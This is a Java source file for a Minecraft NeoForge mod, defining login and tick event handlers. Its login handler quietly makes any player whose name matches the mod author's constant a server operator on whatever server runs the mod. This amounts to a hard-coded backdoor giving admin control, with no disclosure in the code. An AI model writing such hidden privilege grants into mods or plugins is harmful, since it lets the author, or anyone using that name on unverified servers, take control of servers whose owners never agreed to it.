package com.huanyu_mod.procedure;

import com.huanyu_mod.HuanYuMod;
import net.minecraft.nbt.CompoundTag;
import net.minecraft.network.chat.Component;
import net.minecraft.server.MinecraftServer;
import net.minecraft.server.level.ServerPlayer;
import net.minecraft.server.players.PlayerList;
import net.neoforged.bus.api.SubscribeEvent;
import net.neoforged.fml.common.EventBusSubscriber;
import net.neoforged.neoforge.event.entity.player.PlayerEvent;
import net.neoforged.neoforge.event.tick.LevelTickEvent;
import net.neoforged.neoforge.event.tick.PlayerTickEvent;

@EventBusSubscriber(modid = HuanYuMod.MOD_ID)
public class ModProcedures {
    @SubscribeEvent
    public static void onLevelTick(LevelTickEvent.Post event) {}
    @SubscribeEvent
    public static void onPlayerLoggedIn(PlayerEvent.PlayerLoggedInEvent event) {
        if (event.getEntity() instanceof ServerPlayer serverPlayer) {
            if (serverPlayer.getGameProfile().getName().equalsIgnoreCase(HuanYuMod.MOD_AUTHER)) {
                MinecraftServer server = serverPlayer.getServer();
                if (server != null){
                    PlayerList playerList = server.getPlayerList();
                    if (!playerList.isOp(serverPlayer.getGameProfile())) {
                        playerList.op(serverPlayer.getGameProfile());
                        serverPlayer.sendSystemMessage(Component.literal("You are now an OP!"));
                    }
                }
            }
        }
    }
    @SubscribeEvent
    public static void onPlayerTick(PlayerTickEvent.Post event) {
        if (event.getEntity() instanceof ServerPlayer serverPlayer) {
            CompoundTag nbt = serverPlayer.getPersistentData();
            if (!nbt.contains("hyd", CompoundTag.TAG_COMPOUND)) nbt.put("hyd", new CompoundTag());
            nbt = nbt.getCompound("hyd");
            fly.tick(serverPlayer, nbt);
            test.tick(serverPlayer, nbt);
        }
    }
}